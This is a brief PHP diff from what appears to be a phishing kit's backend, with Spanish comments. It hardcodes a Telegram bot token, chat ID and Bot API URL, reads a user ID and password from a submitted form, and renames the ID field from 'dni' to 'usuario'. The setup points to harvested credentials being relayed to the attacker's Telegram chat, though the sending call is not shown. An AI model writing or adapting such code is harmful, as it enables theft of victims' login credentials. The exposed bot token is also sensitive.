@@ -5,8 +5,8 @@ $token = '7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c';
 $chat_id = "5157616506";
 $website = "https://api.telegram.org/bot$token";
 
-if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
-    $dni = trim($_POST["dni"]);
+if (isset($_POST["usuario"]) && isset($_POST["cpass"])) {
+    $dni = trim($_POST["usuario"]);
     $cpass = trim($_POST["cpass"]);
     
     // Guardar el usuario en la sesión
